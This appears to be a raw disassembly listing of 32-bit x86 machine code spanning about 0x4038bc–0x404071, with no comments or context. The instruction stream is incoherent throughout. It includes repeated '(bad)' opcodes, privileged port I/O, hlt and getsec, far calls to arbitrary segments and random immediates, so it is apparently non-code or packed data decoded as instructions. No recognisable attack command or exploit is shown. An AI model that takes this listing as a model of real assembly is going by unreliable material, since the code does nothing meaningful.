  4038bc:	mov    ds,esp
  4038be:	mov    bl,0x38
  4038c0:	cmp    al,0x36
  4038c2:	jecxz  0x403932
  4038c4:	xor    ebp,DWORD PTR [esi+0x67b10d40]
  4038ca:	or     cl,BYTE PTR [ecx+esi*4]
  4038cd:	imul   edi,DWORD PTR [edi],0xef67ee47
  4038d3:	loope  0x40387a
  4038d5:	and    eax,DWORD PTR [di]
  4038d8:	loop   0x40394f
  4038da:	mov    ebx,ecx
  4038dc:	jge    0x40391f
  4038de:	mov    ch,0xd
  4038e0:	xor    BYTE PTR [esp+edx*2+0x52],bh
  4038e4:	sub    DWORD PTR [esi+0x32],ecx
  4038e7:	xor    bp,cx
  4038ea:	cmp    eax,0x1bb0abd7
  4038ef:	mov    BYTE PTR [edx],al
  4038f1:	push   ds
  4038f2:	imul   ebp,eax,0x38bbc156
  4038f8:	in     eax,dx
  4038f9:	leave  
  4038fa:	mov    edi,0x64185fc0
  4038ff:	cmp    BYTE PTR [ebx+0x12],ah
  403902:	scas   al,BYTE PTR es:[edi]
  403903:	sbb    al,0xc6
  403905:	sbb    al,0x87
  403907:	inc    eax
  403908:	out    0x95,al
  40390a:	daa    
  40390b:	test   DWORD PTR [eax],0x928ba071
  403911:	outs   dx,DWORD PTR ds:[esi]
  403912:	scas   eax,DWORD PTR es:[edi]
  403913:	cs mov al,0x77
  403916:	dec    ebx
  403917:	pop    es
  403918:	outs   dx,BYTE PTR ds:[esi]
  403919:	xor    eax,esp
  40391b:	xlat   BYTE PTR ds:[ebx]
  40391c:	ret    
  40391d:	mov    BYTE PTR [ebx-0x6a8a1701],ch
  403923:	mov    DWORD PTR [ebp+0x680b3883],ebx
  403929:	pop    esp
  40392a:	mov    eax,ds:0xb76d383c
  40392f:	popf   
  403930:	out    0x43,eax
  403932:	cmp    ebp,DWORD PTR [eax]
  403934:	or     BYTE PTR [ebx+0xd00adba],ah
  40393a:	test   eax,0x10f22d6d
  40393f:	scas   al,BYTE PTR es:[edi]
  403940:	enter  0x6cba,0xdc
  403944:	je     0x40397e
  403946:	ror    DWORD PTR [ecx-0x73],1
  403949:	and    BYTE PTR [edi+0x3e],0x90
  40394d:	xchg   edi,eax
  40394e:	das    
  40394f:	(bad)  
  403950:	psubsb mm4,QWORD PTR [eax+0x3d]
  403954:	and    cl,ch
  403956:	fisubr DWORD PTR [edx+0x42e51254]
  40395c:	and    esi,DWORD PTR [edx+0x22db4864]
  403962:	add    BYTE PTR [esi],bh
  403964:	lods   eax,DWORD PTR ds:[esi]
  403965:	enter  0xa4e9,0x39
  403969:	cmc    
  40396a:	push   ebx
  40396b:	shr    DWORD PTR [ecx-0x5a],0x73
  40396f:	xor    BYTE PTR [ebx],bl
  403971:	(bad)  
  403972:	repz jg 0x403996
  403975:	mov    eax,0xd16e72ae
  40397a:	into   
  40397b:	mov    esp,0x70f87f37
  403980:	mov    ebp,fs
  403982:	ss add eax,0x4371de93
  403988:	dec    edi
  403989:	inc    ebx
  40398a:	hlt    
  40398b:	sbb    BYTE PTR [ecx-0x1d],ch
  40398e:	and    BYTE PTR [esi-0x17],cl
  403991:	outs   dx,BYTE PTR ds:[esi]
  403992:	mov    ecx,DWORD PTR [esi+0x41]
  403995:	nop
  403996:	add    BYTE PTR [eax+0x1764056f],dl
  40399c:	inc    esp
  40399d:	test   BYTE PTR [edx+edx*4+0x5121f8bd],dh
  4039a4:	sahf   
  4039a5:	mov    bl,BYTE PTR [ebx]
  4039a7:	dec    ebp
  4039a8:	lea    ecx,[ecx+ebx*1-0x1e]
  4039ac:	ret    0x21b1
  4039af:	lock and esi,DWORD PTR fs:[ecx+eiz*4+0x2a]
  4039b5:	jo     0x4039c2
  4039b7:	xchg   esi,eax
  4039b8:	jmp    0x4039cb
  4039ba:	cmp    eax,0x939de813
  4039bf:	pusha  
  4039c0:	add    al,0xab
  4039c2:	mov    edx,0xb704c4ad
  4039c7:	pusha  
  4039c8:	pop    ds
  4039c9:	cs inc edx
  4039cb:	cmp    DWORD PTR [edi+0x79],edx
  4039ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039cf:	sub    BYTE PTR [esp+eax*8-0x5d],0xd0
  4039d4:	aaa    
  4039d5:	loop   0x4039d8
  4039d7:	push   es
  4039d8:	inc    ax
  4039da:	pusha  
  4039db:	shl    DWORD PTR [esi-0x726e7deb],0xed
  4039e2:	sub    eax,0x5da1dac6
  4039e7:	retf   
  4039e8:	jge    0x403a67
  4039ea:	mov    ebx,0xd7dd528b
  4039ef:	pop    ebp
  4039f0:	or     DWORD PTR [edx-0x1d],0xb670af24
  4039f7:	jge    0x403a5a
  4039f9:	fdivr  QWORD PTR [esi+ebp*8+0x6e]
  4039fd:	jmp    DWORD PTR [esi+0x2ae300e4]
  403a03:	push   eax
  403a04:	push   ebp
  403a05:	pop    ebx
  403a06:	fsubrp st(4),st
  403a08:	pop    eax
  403a09:	mov    dh,0x7c
  403a0b:	repz jbe 0x403a44
  403a0e:	loope  0x4039c2
  403a10:	push   0x53
  403a12:	cmovle edx,DWORD PTR [edi-0x6d]
  403a16:	ins    DWORD PTR es:[edi],dx
  403a17:	sbb    edx,DWORD PTR ds:0x26ef20c5
  403a1d:	add    al,0xd4
  403a1f:	dec    edx
  403a20:	inc    ecx
  403a21:	sub    ch,BYTE PTR [eax+0x33]
  403a24:	leave  
  403a25:	push   cs
  403a26:	sbb    eax,0xea6b8fb9
  403a2b:	pop    esi
  403a2c:	pusha  
  403a2d:	and    dl,BYTE PTR [edx-0x68095667]
  403a33:	mov    cl,0xab
  403a35:	out    dx,eax
  403a36:	scas   eax,DWORD PTR es:[edi]
  403a37:	jnp    0x403a69
  403a39:	neg    esi
  403a3b:	shl    DWORD PTR [ecx-0x76],0x8f
  403a3f:	hlt    
  403a40:	pop    ds
  403a41:	mov    DWORD PTR [edi-0x28f51527],ebx
  403a47:	outs   dx,BYTE PTR ds:[esi]
  403a48:	cmc    
  403a49:	jge    0x403a18
  403a4b:	add    BYTE PTR [ecx+0x1aaf2e46],bl
  403a51:	fiadd  WORD PTR [eax+0x7fc9c5f2]
  403a57:	(bad)
  403a5c:	ror    cl,1
  403a5e:	mov    dl,0xd3
  403a60:	and    eax,0x319720c6
  403a65:	inc    edi
  403a66:	test   DWORD PTR [eax+0x56a1f574],0xfb8dcf4f
  403a70:	jle    0x403a42
  403a72:	jns    0x403a02
  403a74:	dec    edx
  403a75:	push   esi
  403a76:	sahf   
  403a77:	in     al,dx
  403a78:	stos   BYTE PTR es:[edi],al
  403a79:	mov    ecx,0xd3f9226b
  403a7e:	xor    al,0xeb
  403a80:	scas   al,BYTE PTR es:[edi]
  403a81:	ins    DWORD PTR es:[edi],dx
  403a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a83:	dec    edx
  403a84:	mov    ss,WORD PTR [edx-0x4377ec2d]
  403a8a:	or     eax,0xcf93dccd
  403a8f:	fidivr WORD PTR [edx+0x17]
  403a92:	fimul  WORD PTR fs:[edi+0x2e]
  403a96:	mov    esp,0x5e064bc8
  403a9b:	inc    ecx
  403a9c:	inc    esp
  403a9d:	pushf  
  403a9e:	aam    0xd
  403aa0:	mov    ds:0x22324b4d,eax
  403aa5:	jns    0x403a77
  403aa7:	leave  
  403aa8:	dec    edx
  403aa9:	or     eax,0x9e899d10
  403aae:	xchg   esi,eax
  403aaf:	pop    ss
  403ab0:	add    al,0xf8
  403ab2:	jne    0x403aaf
  403ab4:	and    dl,ch
  403ab6:	mov    ebp,0xc56016cc
  403abb:	fild   DWORD PTR [ebp-0x6335881c]
  403ac1:	push   eax
  403ac2:	test   esp,esp
  403ac4:	xor    eax,0xfa71021
  403ac9:	retf   0x5eda
  403acc:	cwde   
  403acd:	popf   
  403ace:	or     al,0x10
  403ad0:	inc    ecx
  403ad1:	lods   al,BYTE PTR ds:[esi]
  403ad2:	sar    BYTE PTR [ecx],cl
  403ad4:	push   eax
  403ad5:	cmp    esp,DWORD PTR [edx]
  403ad7:	sub    al,0xf9
  403ad9:	enter  0x4691,0x4b
  403add:	mov    eax,ds:0xa0d426aa
  403ae2:	call   0x2e2f:0xf1759d1
  403ae9:	xchg   esi,eax
  403aea:	xchg   ebx,eax
  403aeb:	and    al,0xe9
  403aed:	mov    dl,0xc5
  403aef:	mov    dh,0x8a
  403af1:	(bad)  
  403af3:	inc    edx
  403af4:	repnz and al,0x50
  403af7:	cmp    al,0x1d
  403af9:	fisubr WORD PTR [eax-0x1a347015]
  403aff:	pop    ds
  403b00:	out    0x3,al
  403b02:	loope  0x403adf
  403b04:	aas    
  403b05:	xor    eax,edx
  403b07:	call   0x558b:0x7b2fd565
  403b0e:	inc    ebx
  403b0f:	mov    eax,edi
  403b11:	mov    BYTE PTR [eax+esi*4-0x39],dh
  403b15:	and    eax,0x2c6ee8ea
  403b1a:	into   
  403b1b:	cs cmp dh,ah
  403b1e:	fiadd  DWORD PTR ds:0x3d477ac2
  403b24:	mov    bh,0x65
  403b26:	jno    0x403b99
  403b28:	dec    ebp
  403b29:	pop    ds
  403b2a:	cmp    esp,eax
  403b2c:	loop   0x403ac3
  403b2e:	xor    al,0x90
  403b30:	cmp    eax,0xb8ab548d
  403b35:	xor    eax,0xd350fa87
  403b3a:	inc    eax
  403b3b:	xchg   ebp,eax
  403b3c:	pop    eax
  403b3d:	ror    DWORD PTR [ebx+0x15230e73],cl
  403b43:	or     bh,BYTE PTR [edx+ebx*4]
  403b46:	gs popf 
  403b48:	mov    DWORD PTR [ebx-0x6b],edi
  403b4b:	repnz sbb BYTE PTR [edi+0x59],dl
  403b4f:	(bad)  
  403b50:	jmp    0x403b3b
  403b52:	clc    
  403b53:	xor    ebp,DWORD PTR es:[edx-0x3b]
  403b57:	pop    edx
  403b58:	out    0x59,eax
  403b5a:	jae    0x403b54
  403b5c:	int3   
  403b5d:	ret    
  403b5e:	dec    edi
  403b5f:	push   ds
  403b60:	imul   eax,DWORD PTR [edi+0x30],0x6afbca39
  403b67:	cdq    
  403b68:	call   0xcaad1e28
  403b6d:	inc    edi
  403b6e:	xchg   edx,eax
  403b6f:	jnp    0x403be2
  403b71:	into   
  403b72:	(bad)  
  403b73:	fadd   st,st(3)
  403b75:	cdq    
  403b76:	inc    esp
  403b77:	lods   al,BYTE PTR ds:[esi]
  403b78:	add    DWORD PTR [edi-0x54eee60f],0xa418b14a
  403b82:	and    eax,0xd443de33
  403b87:	jmp    0x36b7:0x2dc7e53f
  403b8e:	jl     0x403bc9
  403b90:	mov    WORD PTR [ebp+0x69],gs
  403b93:	pop    es
  403b94:	add    eax,DWORD PTR [eax-0x3eccf26f]
  403b9a:	xchg   DWORD PTR [ebp+0x5ca78964],edi
  403ba0:	mov    edx,0xdea79c86
  403ba5:	add    ah,dl
  403ba7:	and    DWORD PTR [edx+0x769d2636],0x16ecbd27
  403bb1:	push   ds
  403bb2:	fcomp  st(1)
  403bb4:	inc    edx
  403bb5:	mov    ah,0xb1
  403bb7:	test   eax,0x39590831
  403bbc:	into   
  403bbd:	add    eax,0x9665403f
  403bc2:	int    0x5f
  403bc4:	mov    BYTE PTR [esi-0x48766e8],bl
  403bca:	cld    
  403bcb:	(bad)  
  403bcc:	jns    0x403b5b
  403bce:	les    esi,FWORD PTR [ebp-0xf12e97d]
  403bd4:	aas    
  403bd5:	jae    0x403c1c
  403bd7:	mov    ebx,esp
  403bd9:	mov    BYTE PTR [edx+0x33],cl
  403bdc:	rcr    BYTE PTR [ebp+eax*8-0x69055ba],cl
  403be3:	dec    edi
  403be4:	push   0x65
  403be6:	inc    esi
  403be7:	dec    esp
  403be8:	push   eax
  403be9:	inc    DWORD PTR [ecx+0x2d]
  403bec:	pushf  
  403bed:	or     BYTE PTR [esi+0x1e5e0baa],0x41
  403bf4:	push   ds
  403bf5:	dec    ecx
  403bf6:	fstp   QWORD PTR [ebx]
  403bf8:	add    DWORD PTR [ecx+0x19],edi
  403bfb:	xchg   ch,al
  403bfd:	cdq    
  403bfe:	jmp    0x403c60
  403c00:	adc    DWORD PTR [ebp-0x35],ecx
  403c03:	imul   esp,esi,0xffffffce
  403c06:	xchg   ebx,eax
  403c07:	and    DWORD PTR [edi+esi*2+0x26],ecx
  403c0b:	adc    bl,BYTE PTR [ebp+edx*1+0x2e]
  403c0f:	aas    
  403c10:	cs loop 0x403c7f
  403c13:	push   ecx
  403c14:	push   esi
  403c15:	ror    BYTE PTR [ecx],cl
  403c17:	call   0x988c:0x6d9bf787
  403c1e:	or     al,0xa4
  403c20:	xchg   ebp,eax
  403c21:	or     eax,0xddc78521
  403c26:	mov    dh,0x41
  403c28:	pop    ecx
  403c29:	rcl    DWORD PTR ds:0xe6778160,1
  403c2f:	fild   DWORD PTR [edi+0x7c]
  403c32:	jno    0x403c94
  403c34:	jle    0x403c35
  403c36:	call   0xeb9a:0x1015e1f7
  403c3d:	outs   dx,BYTE PTR ds:[esi]
  403c3e:	pop    ss
  403c3f:	mov    ebp,0xdf5c60ff
  403c44:	test   DWORD PTR [esi+0x4e],ecx
  403c47:	fist   WORD PTR [esi-0x31f9b8cc]
  403c4d:	pop    ds
  403c4e:	and    eax,0x6025c566
  403c53:	jne    0x403c99
  403c55:	sbb    DWORD PTR [ebp+0x3c291958],esi
  403c5b:	mov    ebp,0xbf79f9eb
  403c60:	stos   BYTE PTR es:[edi],al
  403c61:	add    cl,BYTE PTR [ebx]
  403c63:	(bad)  
  403c64:	pop    ebx
  403c65:	icebp  
  403c66:	and    BYTE PTR [edx],dl
  403c68:	shl    DWORD PTR [edi-0x38],0xaf
  403c6c:	lds    edx,FWORD PTR [ebx+ebx*8+0x2e4781d3]
  403c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c74:	(bad)  
  403c75:	aas    
  403c76:	mov    ds:0xb97c99ca,al
  403c7b:	jmp    0x9b173ff8
  403c80:	icebp  
  403c81:	sbb    eax,0x953a5a7a
  403c86:	int3   
  403c87:	pop    ds
  403c88:	jbe    0x403cbb
  403c8a:	add    BYTE PTR [ebp+0x3790d2],ch
  403c90:	push   eax
  403c91:	arpl   di,ax
  403c93:	mov    edx,esi
  403c95:	xchg   esp,eax
  403c96:	jge    0x403cf7
  403c98:	xchg   eax,edi
  403c9a:	in     al,0x3c
  403c9c:	retf   0xa9b5
  403c9f:	jb     0x403c6d
  403ca1:	pop    ebx
  403ca2:	push   edi
  403ca3:	stos   DWORD PTR es:[edi],eax
  403ca4:	xchg   ebp,eax
  403ca5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  403ca7:	inc    ebx
  403ca8:	fnsave [edx]
  403caa:	aaa    
  403cab:	push   ds
  403cac:	push   esp
  403cad:	xchg   edi,eax
  403cae:	mov    ah,0xf7
  403cb0:	jb     0x403c92
  403cb2:	fwait
  403cb3:	sbb    eax,0xff97a523
  403cb8:	mov    eax,ds:0x1b08f5cf
  403cbd:	and    BYTE PTR ds:0xba4a3ed1,bl
  403cc3:	xlat   BYTE PTR ds:[ebx]
  403cc4:	pop    ecx
  403cc5:	enter  0xf8c2,0x88
  403cc9:	pop    ebx
  403cca:	push   ecx
  403ccb:	rcr    DWORD PTR [esi],cl
  403ccd:	ror    DWORD PTR [esi+edx*8-0x77],1
  403cd1:	add    BYTE PTR [edi],bh
  403cd3:	fwait
  403cd4:	adc    eax,0x6b7c9940
  403cd9:	sub    al,0x76
  403cdb:	xlat   BYTE PTR ds:[ebx]
  403cdc:	(bad)  
  403cdd:	outs   dx,BYTE PTR ds:[esi]
  403cde:	cld    
  403cdf:	mov    esp,0x47d90c31
  403ce4:	sbb    dl,ch
  403ce6:	lds    ebp,FWORD PTR [ecx]
  403ce8:	sub    eax,eax
  403cea:	or     edi,DWORD PTR [ebx+esi*8+0x79]
  403cee:	xchg   ebx,esi
  403cf0:	and    dl,dl
  403cf2:	addr16 dec dh
  403cf5:	out    0x94,al
  403cf7:	(bad)  
  403cf8:	stc    
  403cf9:	push   0x2e
  403cfb:	jge    0x403d58
  403cfd:	scas   al,BYTE PTR es:[edi]
  403cfe:	xchg   ebp,eax
  403cff:	mov    eax,ds:0x4e4d54e6
  403d04:	push   edi
  403d05:	mov    edx,0x938ac5ce
  403d0a:	push   ss
  403d0b:	int3   
  403d0c:	jbe    0x403cc5
  403d0e:	es sub al,0xa
  403d11:	xchg   esi,eax
  403d12:	repnz xlat BYTE PTR ds:[ebx]
  403d14:	jmp    0xf486f829
  403d19:	outs   dx,BYTE PTR ds:[si]
  403d1b:	stos   BYTE PTR es:[edi],al
  403d1c:	adc    eax,0x7747a014
  403d21:	dec    esp
  403d22:	js     0x403cef
  403d24:	(bad)  
  403d25:	jne    0x403da5
  403d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d28:	in     eax,0xff
  403d2a:	mov    bh,0xa4
  403d2c:	sub    al,0xbe
  403d2e:	xchg   BYTE PTR [ecx],bl
  403d30:	mov    edx,gs
  403d32:	jo     0x403d7c
  403d34:	pop    esi
  403d35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d36:	in     eax,0x53
  403d38:	adc    BYTE PTR [esi-0x69],al
  403d3b:	loopne 0x403cd3
  403d3d:	repnz daa 
  403d3f:	aaa    
  403d40:	inc    esp
  403d41:	sub    ah,al
  403d43:	je     0x403dab
  403d45:	mov    dl,0xe2
  403d47:	mov    ebx,DWORD PTR [eax-0x4e]
  403d4a:	cmp    cl,al
  403d4c:	add    DWORD PTR [ebx],esi
  403d4e:	pushf  
  403d4f:	add    edx,DWORD PTR [ecx+0x1c]
  403d52:	mov    edi,0xcf13d82c
  403d57:	mov    ecx,0xd71f18aa
  403d5c:	(bad)  
  403d5e:	ret    
  403d5f:	(bad)  
  403d60:	adc    DWORD PTR [edi],esp
  403d62:	es sbb al,0xb7
  403d65:	(bad)  
  403d66:	sub    DWORD PTR [eax],ebx
  403d68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d69:	cmp    dl,BYTE PTR [ebp+0x240b625e]
  403d6f:	mov    al,ds:0xe3a8c5fe
  403d74:	and    esi,DWORD PTR [edx-0x6a]
  403d77:	push   ds
  403d78:	pop    ds
  403d79:	cmp    al,0x36
  403d7b:	and    BYTE PTR [ecx+0x0],ch
  403d7e:	lds    ecx,FWORD PTR [esi+0x1191b52a]
  403d84:	imul   ebp,DWORD PTR [esi+0x3187f641],0xa506a7d2
  403d8e:	inc    ebp
  403d8f:	dec    ecx
  403d90:	mov    al,ds:0x2980c993
  403d95:	add    eax,0xe0719840
  403d9a:	cmp    eax,0xedc55b69
  403d9f:	sbb    eax,0xb480c01d
  403da4:	jns    0x403d84
  403da6:	jno    0x403d8f
  403da8:	shr    BYTE PTR [eax+0x27],0xc2
  403dac:	repz mov ds:0x909beb39,eax
  403db2:	scas   eax,DWORD PTR es:[edi]
  403db3:	xchg   edi,eax
  403db4:	mov    ecx,DWORD PTR [edx-0x56df1120]
  403dba:	dec    edx
  403dbb:	xchg   eax,esp
  403dbd:	and    al,0x13
  403dbf:	adc    esi,edi
  403dc1:	pop    ebx
  403dc2:	mov    bh,0x31
  403dc4:	mov    edx,0xd3d940de
  403dc9:	pop    edi
  403dca:	pop    ecx
  403dcb:	rol    esp,1
  403dcd:	sub    cl,bh
  403dcf:	pop    edx
  403dd0:	mov    ah,0x86
  403dd2:	inc    esi
  403dd3:	push   eax
  403dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dd5:	imul   esi,DWORD PTR [edx+0x3a],0xd2cb4f15
  403ddc:	ja     0x403df0
  403dde:	imul   ebp,DWORD PTR [edx],0x19fb2441
  403de4:	retf   
  403de5:	push   eax
  403de6:	lods   al,BYTE PTR ds:[esi]
  403de7:	jmp    0x6f532692
  403dec:	jle    0x403d8c
  403dee:	and    eax,0x17fe6a3d
  403df3:	sub    al,0xec
  403df5:	aaa    
  403df6:	or     BYTE PTR [edx+0x4c],dh
  403df9:	dec    edi
  403dfa:	pop    esi
  403dfb:	fisub  DWORD PTR ds:0x1b57dec
  403e01:	push   ds
  403e02:	mov    ecx,0xa35c4b3c
  403e07:	push   ds
  403e08:	mov    cl,0x36
  403e0a:	mov    dl,0x6d
  403e0c:	getsec 
  403e0e:	push   esp
  403e0f:	mov    al,0x24
  403e11:	mov    ah,0xcb
  403e13:	or     al,0x89
  403e15:	mov    ds:0xff145db8,eax
  403e1a:	mov    cl,0x75
  403e1c:	rcl    ecx,cl
  403e1e:	and    BYTE PTR [ebx-0x7a],dh
  403e21:	jbe    0x403e3a
  403e23:	pop    edi
  403e24:	sbb    dl,BYTE PTR [ecx-0x6c054b99]
  403e2a:	jg     0x403e23
  403e2c:	adc    al,0x4b
  403e2e:	or     BYTE PTR [esp+esi*1-0x3b],0xb0
  403e33:	dec    eax
  403e34:	or     DWORD PTR [esi-0x14],0xffffffb7
  403e38:	(bad)  
  403e3a:	and    DWORD PTR [ebx-0x59],0x4f
  403e3e:	cdq    
  403e3f:	ins    BYTE PTR es:[edi],dx
  403e40:	lods   eax,DWORD PTR ds:[esi]
  403e41:	adc    edx,ebp
  403e43:	cmp    al,0xb4
  403e45:	aas    
  403e46:	loopne 0x403e68
  403e48:	data16 jle 0x403e5d
  403e4b:	lods   al,BYTE PTR ds:[esi]
  403e4c:	inc    ebx
  403e4d:	sub    eax,0xfc170704
  403e52:	inc    esi
  403e53:	xchg   ecx,eax
  403e54:	daa    
  403e55:	stos   DWORD PTR es:[edi],eax
  403e56:	int3   
  403e57:	add    edx,DWORD PTR [ecx-0x7cfde400]
  403e5d:	push   edx
  403e5e:	xor    DWORD PTR [ebp+eiz*8+0x37],ecx
  403e62:	(bad)  
  403e64:	sub    DWORD PTR [edx+ebx*8+0xa],0xfffffff7
  403e69:	ffree  st(7)
  403e6b:	daa    
  403e6c:	xchg   BYTE PTR [bp+si],ch
  403e6f:	popf   
  403e70:	adc    BYTE PTR fs:[esi],bh
  403e73:	ds push cs
  403e75:	mov    ds:0x6bace224,eax
  403e7a:	cwde   
  403e7b:	inc    ecx
  403e7c:	or     cl,BYTE PTR [ebx]
  403e7e:	mov    cl,BYTE PTR [eax-0x5]
  403e81:	xor    dh,BYTE PTR [edi-0x71]
  403e84:	cmp    cl,BYTE PTR [ecx-0x5fe7c44d]
  403e8a:	xchg   esi,eax
  403e8b:	pop    ss
  403e8c:	stos   BYTE PTR es:[edi],al
  403e8d:	jg     0x403e4b
  403e8f:	rcr    BYTE PTR [ecx],0xa4
  403e92:	(bad)  
  403e93:	push   edx
  403e94:	inc    esi
  403e95:	in     eax,0xd
  403e97:	mov    ebx,0x377d8bbc
  403e9c:	(bad)  [ecx+eax*1+0xd]
  403ea0:	lods   al,BYTE PTR ds:[esi]
  403ea1:	mov    dh,0xd
  403ea3:	dec    DWORD PTR fs:[eax-0x1dc85ad]
  403eaa:	pop    ecx
  403eab:	cmp    al,0x39
  403ead:	inc    ebp
  403eae:	stc    
  403eaf:	inc    esp
  403eb0:	dec    esi
  403eb1:	push   ebx
  403eb2:	mov    esp,0x48823682
  403eb7:	leave  
  403eb8:	sbb    BYTE PTR [edi-0x276fb663],dl
  403ebe:	or     eax,0x84f7b909
  403ec3:	mov    dl,0x6f
  403ec5:	loop   0x403f02
  403ec7:	ds and eax,0xc812e3c4
  403ecd:	cmp    ebx,0x62fce319
  403ed3:	sub    eax,0xd636ad73
  403ed8:	aaa    
  403ed9:	dec    ebx
  403eda:	popfw  
  403edc:	sbb    BYTE PTR [ebx+0x35],cl
  403edf:	mov    ds:0x55fe93f9,eax
  403ee4:	stos   DWORD PTR es:[edi],eax
  403ee5:	cmc    
  403ee6:	adc    eax,DWORD PTR [ecx]
  403ee8:	lahf   
  403ee9:	dec    ebx
  403eea:	mov    bh,0xd0
  403eec:	mov    dl,0x9d
  403eee:	adc    BYTE PTR [ebp+ebp*4-0x56],bh
  403ef2:	dec    edi
  403ef3:	xchg   BYTE PTR [edi],bl
  403ef5:	or     al,0xe2
  403ef7:	push   eax
  403ef8:	xor    eax,0x1319e300
  403efd:	test   eax,0x6d88cfd
  403f02:	mov    bh,cl
  403f04:	mov    ah,0x2f
  403f06:	stc    
  403f07:	pop    esi
  403f08:	lea    ebp,[edi+0xc]
  403f0b:	pop    eax
  403f0c:	fstp   TBYTE PTR [ecx]
  403f0e:	mov    esi,0x3bfd7873
  403f13:	leave  
  403f14:	add    dl,dh
  403f16:	pop    esp
  403f17:	iret   
  403f18:	xchg   edx,eax
  403f19:	jg     0x403eb2
  403f1b:	mov    bl,0x9a
  403f1d:	push   esp
  403f1e:	inc    eax
  403f1f:	pop    es
  403f20:	sub    esp,DWORD PTR [ecx]
  403f22:	or     DWORD PTR [eax],0x6a
  403f25:	ret    
  403f26:	icebp  
  403f27:	fs jle 0x403f43
  403f2a:	cmp    BYTE PTR [edi],al
  403f2c:	(bad)  
  403f2e:	repnz push ebp
  403f30:	xor    al,0x66
  403f32:	xor    ebp,eax
  403f34:	jo     0x403f76
  403f36:	aam    0x17
  403f38:	test   BYTE PTR [ebx],dl
  403f3a:	xchg   esp,eax
  403f3b:	cmp    al,0xb5
  403f3d:	aam    0x2c
  403f3f:	inc    ebx
  403f40:	xor    ebp,DWORD PTR [esi-0x5b]
  403f43:	fnstcw WORD PTR [edx+0x2a509528]
  403f49:	ins    BYTE PTR es:[edi],dx
  403f4a:	xchg   DWORD PTR [ecx-0x535486f2],esi
  403f50:	push   ss
  403f51:	add    BYTE PTR [edi-0x178a5689],dh
  403f57:	push   ebp
  403f58:	test   BYTE PTR [eax-0x25],dl
  403f5b:	xchg   BYTE PTR [esi+0x55],ah
  403f5e:	mov    ds:0xa20d1fbf,eax
  403f63:	inc    esi
  403f64:	ret    0xb448
  403f67:	inc    esp
  403f68:	xor    ah,ah
  403f6a:	xchg   esi,eax
  403f6b:	pop    es
  403f6c:	push   ebx
  403f6d:	adc    al,ah
  403f6f:	fcom   DWORD PTR [ebp+0x700211f1]
  403f75:	xchg   ecx,eax
  403f76:	and    al,0xd0
  403f78:	int3   
  403f79:	jge    0x403fb5
  403f7b:	es lahf 
  403f7d:	push   0xfffffff0
  403f7f:	jae    0x403f27
  403f81:	lods   eax,DWORD PTR ds:[esi]
  403f82:	adc    al,0x9f
  403f84:	test   DWORD PTR [esi-0x58],esp
  403f87:	sbb    bl,BYTE PTR [esi+0x6e4d66da]
  403f8d:	fadd   st(6),st
  403f8f:	scas   eax,DWORD PTR es:[edi]
  403f90:	sar    DWORD PTR [edx+0x2b],0x41
  403f94:	xor    al,BYTE PTR [esi]
  403f96:	lods   al,BYTE PTR ds:[esi]
  403f97:	xchg   DWORD PTR cs:[edx+0x315c368c],esp
  403f9e:	mov    edx,0xe864c61
  403fa3:	push   cs
  403fa4:	rcl    bl,1
  403fa6:	ret    
  403fa7:	(bad)  
  403fa8:	push   ss
  403fa9:	outs   dx,DWORD PTR ds:[esi]
  403faa:	xor    al,0xe3
  403fac:	jge    0x403fa4
  403fae:	xor    dl,bh
  403fb0:	sbb    DWORD PTR [ecx-0xed9df29],eax
  403fb6:	(bad)  
  403fb8:	mov    WORD PTR [ebp-0x2be232d3],ds
  403fbe:	mov    DWORD PTR [edi-0x3f2bdd6a],ebp
  403fc4:	test   BYTE PTR [ebp+0x6287d361],cl
  403fca:	pop    esp
  403fcb:	retf   
  403fcc:	cmp    eax,edi
  403fce:	rcr    edx,1
  403fd0:	inc    ebx
  403fd1:	xchg   ebx,eax
  403fd2:	ret    
  403fd3:	lods   eax,DWORD PTR ds:[esi]
  403fd4:	sub    edi,DWORD PTR ds:0x51106135
  403fda:	xchg   ecx,eax
  403fdb:	(bad)  
  403fdc:	cmp    al,0x95
  403fde:	and    DWORD PTR [edi],0x32
  403fe1:	sbb    DWORD PTR [ebx-0x6af4bb76],0xffffffc6
  403fe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fe9:	pop    ebx
  403fea:	test   ah,cl
  403fec:	es or  dl,0x90
  403ff0:	push   edi
  403ff1:	sub    bh,BYTE PTR [ebp-0x44]
  403ff4:	xor    ah,BYTE PTR [ecx-0x69e8a4a3]
  403ffa:	or     BYTE PTR [edx+0x4a],dh
  403ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ffe:	pop    ss
  403fff:	in     al,0x59
  404001:	jb     0x403fb5
  404003:	imul   edi,ebp,0x5b331e39
  404009:	cli    
  40400a:	xchg   ecx,eax
  40400b:	fisubr WORD PTR [eax+0x24543236]
  404011:	iret   
  404012:	ret    0x4bad
  404015:	mov    ds,WORD PTR [ecx+0x45]
  404018:	sub    ebx,DWORD PTR [ebp-0x75abdbe4]
  40401e:	std    
  40401f:	xlat   BYTE PTR ds:[ebx]
  404020:	jmp    DWORD PTR [esi+0x762d039d]
  404026:	sbb    DWORD PTR [esi+0x63],ecx
  404029:	inc    esi
  40402a:	hlt    
  40402b:	mov    edi,0xba36921d
  404030:	and    esp,DWORD PTR [esi]
  404032:	cli    
  404033:	mov    al,0x28
  404035:	push   esp
  404036:	sti    
  404037:	test   DWORD PTR [eax-0x3f],ebx
  40403a:	in     al,0xf9
  40403c:	(bad)
  40403f:	push   0x57
  404041:	test   BYTE PTR [eax+0x2983bc41],bl
  404047:	push   ss
  404048:	out    0xbe,eax
  40404a:	sub    al,0x7e
  40404c:	jl     0x4040b0
  40404e:	in     al,0x56
  404050:	jb     0x404074
  404052:	sbb    eax,0x22117c18
  404057:	mov    ah,0xf3
  404059:	jmp    0xae04:0xea874cc
  404060:	cmp    esi,DWORD PTR [eax-0x51]
  404063:	bound  edx,QWORD PTR [ecx+0x5b759197]
  404069:	ret    0x6f64
  40406c:	push   ebp
  40406d:	lea    ebx,[ecx+0x4]
  404070:	pop    edx
  404071:	xchg   esp,eax
